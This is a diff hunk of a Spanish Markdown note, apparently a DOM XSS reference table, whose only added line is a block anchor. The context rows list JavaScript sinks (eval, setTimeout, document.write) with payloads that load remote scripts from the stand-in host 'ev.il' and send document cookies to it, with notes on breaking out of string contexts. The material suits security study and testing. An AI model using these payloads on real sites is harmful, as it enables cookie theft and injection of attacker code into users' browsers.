@@ -24,6 +24,7 @@ linked:
 |    <br><br>**Sink**    |       <br><br>`eval()` / `Function()`        |        <br><pre><code>`\'-alert(1)//` o `");import('//ev.il/x.js');//`</code></pre>         | <br>Escape de contexto dentro de bloques preexistentes. Si el input se concatena (ej. `eval("var usr = '"+input+"';")`), el payload rompe la asignación original y ejecuta el código.<br><br> |
 |  <br><br><br>**Sink**  | <br><br><br>`setTimeout()` / `setInterval()` |            <br><br><pre><code>`1000); fetch('//ev.il/'+cookie); //`</code></pre>            | <br>Ocurre cuando se pasa una cadena en lugar de un _callback_ (ej. `setTimeout("log('"+input+"')", 1000)`). El payload cierra la función original y encadena la ejecución maliciosa.<br><br> |
 |  <br><br><br>**Sink**  |        <br><br><br>`document.write()`        |       <br><pre><code>`</script><script src="//ev.il/hook.js"></script>`</code></pre>        | <br>Típico en integraciones legacy o Ad-Tech. Se requiere cerrar explícitamente el contexto del `<script>` actual para que el motor del navegador parsee e incruste el script remoto.<br><br> |
+^xss-sources
 
 ### Flujo de Ejecución y Trazado de Variables
 
